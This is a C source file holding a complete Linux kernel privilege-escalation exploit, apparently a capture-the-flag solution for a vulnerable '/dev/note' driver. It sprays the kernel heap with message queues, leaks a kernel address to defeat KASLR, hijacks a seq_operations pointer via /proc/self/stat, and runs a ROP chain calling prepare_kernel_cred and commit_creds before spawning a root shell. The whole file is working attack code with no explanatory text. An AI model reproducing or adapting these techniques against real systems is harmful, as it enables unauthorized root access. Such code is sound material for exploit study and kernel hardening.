#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>


// commands
#define DEV_PATH "/dev/note"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)


// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define uint unsigned int
#define scu static const ulong
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) assert(sizeof(msgbuf.mtext) > 0x30); \
                        for(int ix=0; ix!=N; ++ix){\
                          if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit("KMALLOC");}
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}
// should  compile with  -masm=intel
static void save_state(void) {
  asm(
      "movq %0, %%cs\n"
      "movq %1, %%ss\n"
      "movq %2, %%rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) :: "memory"
   );
}

static void shellcode(void){
  asm(
    "xor rdi, rdi\n"
    "mov rbx, QWORD PTR [rsp+0x50]\n"
    "sub rbx, 0x244566\n"
    "mov rcx, rbx\n"
    "call rcx\n"
    "mov rdi, rax\n"
    "sub rbx, 0x470\n"
    "call rbx\n"
    "add rsp, 0x20\n"
    "pop rbx\n"
    "pop r12\n"
    "pop r13\n"
    "pop r14\n"
    "pop r15\n"
    "pop rbp\n"
    "ret\n"
  );
}
// (END utils)

// (shared_house)
#define SH_ALLOC  0xC12ED001
#define SH_FREE   0xC12ED002
#define SH_WRITE  0xC12ED003
#define SH_READ   0xC12ED004

#define FAIL1     0xffffffffffffffa
#define FAIL2     0xfffffffffffffff

struct query{
  ulong size;
  char *buf;
};

#define INF 1<<31
int shfd;
int statfd;
uint current_size = INF;


void _alloc(uint size){
  printf("[+] alloc: %x\n", size);
  assert(size <= 0x80);
  struct query q = {
    .size = size
  };
  int tmp = ioctl(shfd, SH_ALLOC, &q);
  assert(tmp!=FAIL1 && tmp!=FAIL2);
  current_size = size;
}

void _free(void){
  printf("[+] free\n");
  assert(current_size != INF);
  struct query q = {
  };
  int tmp = ioctl(shfd, SH_FREE, &q);
  assert(tmp!=FAIL1 && tmp!=FAIL2);
  current_size = INF;
}

void _write(char *buf, uint size){
  printf("[+] write: %p %x\n", buf, size);
  assert(current_size != INF && size <= current_size);
  assert(current_size != -1);
  struct query q = {
    .buf = buf,
    .size = size
  };
  int tmp = ioctl(shfd, SH_WRITE, &q);
  assert(tmp!=FAIL1 && tmp!=FAIL2);
}

void _read(char *buf, uint size){
  printf("[+] read: %p %x\n", buf, size);
  assert(current_size != INF && size <= current_size);
  struct query q = {
    .buf = buf,
    .size = size
  };
  int tmp = ioctl(shfd, SH_READ, &q);
  assert(tmp!=FAIL1 && tmp!=FAIL2);
}
// (END shared_house)

/*********** MAIN *********************************/

struct _msgbuf80{
  long mtype;
  char mtext[0x80];
};

void gen_chain(ulong **a, const ulong kernbase)
{
  scu pop_rdi = 0x11c353;
  scu prepare_kernel_cred = 0x69e00;
  scu rax2rdi_rep_pop_rbp = 0x1877F; // 0xffffffff8101877f: mov rdi, rax ; rep movsq  ; pop rbp ; ret  ;  (1 found)
  scu commit_creds = 0x069c10; // 0xffffffff81069c10
  scu pop_rcx = 0x368fa; // 0xffffffff810368fa: pop rcx ; ret  ;  (53 found)
  scu pop_r11 = 0xe12090; // 0xffffffff81e12090: pop r11 ; ret  ;  (2 found)
  scu swapgs_pop_rbp = 0x03ef24; // 0xffffffff8103ef24:       0f 01 f8     swapgs
  scu iretq_pop_rbp = 0x1d5c6; // 0xffffffff8101d5c6:   48 cf   iretq

  save_state();

  *a++ = pop_rdi + kernbase;
  *a++ = 0;
  *a++ = prepare_kernel_cred + kernbase;
  *a++ = pop_rcx + kernbase;
  *a++ = 0;
  *a++ = rax2rdi_rep_pop_rbp + kernbase;
  *a++ = 0;
  *a++ = commit_creds + kernbase;

  *a++ = swapgs_pop_rbp + kernbase;
  *a++ = 0;
  *a++ = iretq_pop_rbp + kernbase;
  *a++ = &NIRUGIRI;
  *a++ = user_cs;
  *a++ = user_rflags;
  *a++ = user_sp;
  *a++ = user_ss;

  *a++ = 0xdeadbeef; // unreachable
}

int main(int argc, char *argv[]) {
  char buf[0x1000];
  shfd = open(DEV_PATH, O_RDWR);
  assert(shfd >= 0);

  int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  if(qid == -1) errExit("msgget");
  struct _msgbuf80 msgbuf = { .mtype = 1 };
  KMALLOC(qid, msgbuf, 0xF);

  _alloc(0x80);
  memset(buf, 'X', 0x80);
  _write(buf, 0x80); // vuln

  _free();
  KMALLOC(qid, msgbuf, 0x1);
  memset(buf, 0, 0x8);
  //*((ulong*)buf) = (ulong)maddr;
  _alloc(0x80);
  _write(buf, 0x80);
  assert(socket(22, AF_INET, 0) < 0); // overlap subprocess_info
  _read(buf, 0x80);
  const ulong call_usermodehelper_exec_work = ((ulong*)buf)[0x18/sizeof(ulong)];
  printf("[!] call_usermodehelper_exec_work: 0x%lx\n", call_usermodehelper_exec_work);
  const ulong kernbase = call_usermodehelper_exec_work - (0xffffffff81060160 - 0xffffffff81000000);
  printf("[!] kernbase: 0x%lx\n", kernbase);
  _free();

  for(int ix=0; ix!=0x82; ++ix){
    statfd = open("/proc/self/stat", O_RDONLY);
    assert(statfd > 0);
  }
  _alloc(0x20);
  memset(buf, 'x', 0x20);
  _write(buf, 0x20);  // vuln
  _free();
  statfd = open("/proc/self/stat", O_RDONLY); // dummy
  _alloc(0x20);
  statfd = open("/proc/self/stat", O_RDONLY); // victim

  *((ulong*)buf) = kernbase + 0x05832b;
  _write(buf, 0x20);

  // prepare chain
  const ulong gadstack = 0x83C389C0;
  const char *maddr = mmap((void*)(gadstack & ~0xFFF), 4*PAGE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
  printf("[+] mmapped @ %p\n", maddr);
  const char *chain = maddr + (gadstack & 0xFFF);
  gen_chain(chain, kernbase);

  // NIRUGIRI
  read(statfd, buf, 1);

  return 0;
}
